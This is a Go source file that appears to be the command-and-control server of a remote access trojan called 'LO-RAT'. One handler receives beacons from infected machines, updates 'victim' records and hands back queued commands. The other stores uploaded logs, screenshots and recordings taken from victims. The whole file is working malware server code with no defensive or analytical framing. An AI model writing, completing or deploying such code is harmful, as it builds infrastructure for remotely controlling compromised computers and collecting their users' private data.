package api

import (
    "encoding/json"
    "net/http"
    "LO-RAT/server/internal/db"
    "LO-RAT/server/internal/models"
)

func BeaconHandler(w http.ResponseWriter, r *http.Request) {
    var beacon models.Beacon
    if err := json.NewDecoder(r.Body).Decode(&beacon); err != nil {
        http.Error(w, err.Error(), 400)
        return
    }
    
    // Update victim in DB
    db.UpdateVictim(beacon)
    
    // Fetch pending commands
    commands := db.GetCommands(beacon.UUID)
    
    resp := models.BeaconResponse{Commands: commands}
    json.NewEncoder(w).Encode(resp)
}

func UploadHandler(w http.ResponseWriter, r *http.Request) {
    // Handle multipart file uploads (logs, screenshots, recordings)
    r.ParseMultipartForm(32 << 20) // 32MB
    file, _, err := r.FormFile("data")
    if err != nil { http.Error(w, err.Error(), 400); return }
    defer file.Close()
    
    db.StoreFile(r.FormValue("uuid"), r.FormValue("filename"), file)
    w.WriteHeader(200)
}